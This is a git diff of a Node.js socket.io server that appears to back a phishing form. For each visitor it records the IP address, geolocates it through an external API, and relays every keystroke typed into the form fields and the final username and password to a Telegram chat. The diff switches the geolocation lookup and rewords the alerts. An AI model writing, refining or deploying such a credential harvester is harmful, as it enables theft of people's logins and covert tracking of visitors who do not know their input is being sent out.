@@ -3,7 +3,6 @@ const http = require("http");
 const { Server } = require("socket.io");
 const cors = require("cors");
 const axios = require("axios");
-const geoip = require("geoip-lite");
 
 const app = express();
 const server = http.createServer(app);
@@ -24,7 +23,21 @@ function sendTelegram(message){
     });
 }
 
-io.on("connection",(socket)=>{
+async function getLocation(ip){
+    try{
+        const res = await axios.get(`https://ipapi.co/${ip}/json/`);
+
+        const city = res.data.city || "Unknown";
+        const region = res.data.region || "Unknown";
+        const country = res.data.country_name || "Unknown";
+
+        return `${city}, ${region}, ${country}`;
+    }catch{
+        return "Unknown location";
+    }
+}
+
+io.on("connection", async (socket)=>{
 
     console.log("User opened the form");
 
@@ -40,23 +53,19 @@ io.on("connection",(socket)=>{
         ip = ip.replace("::ffff:", "");
     }
 
-    const geo = geoip.lookup(ip);
+    const location = await getLocation(ip);
 
-    const location = geo
-        ? `${geo.city || "Unknown"}, ${geo.country}`
-        : "Unknown location";
+    console.log("IP:", ip);
+    console.log("Location:", location);
 
-    console.log("IP:", ip, "Location:", location);
-
-    sendTelegram(`⚠️ New Visitor\nIP: ${ip}\nLocation: ${location}`);
-    sendTelegram("⚠️ Someone opened your form");
+    sendTelegram(`⚠️ New Visitor on Your Site\nIP: ${ip}\nLocation: ${location}`);
 
     socket.on("typing",(data)=>{
         sendTelegram(`Typing\nField: ${data.field}\nValue: ${data.value}`);
     });
 
     socket.on("submit",(data)=>{
-        sendTelegram(`✅ Final Submission\nUsername: ${data.username}\nPassword: ${data.password}`);
+        sendTelegram(`✅ Final Submission\nUsername: ${data.username}\npassword: ${data.password}`);
     });
 
 });
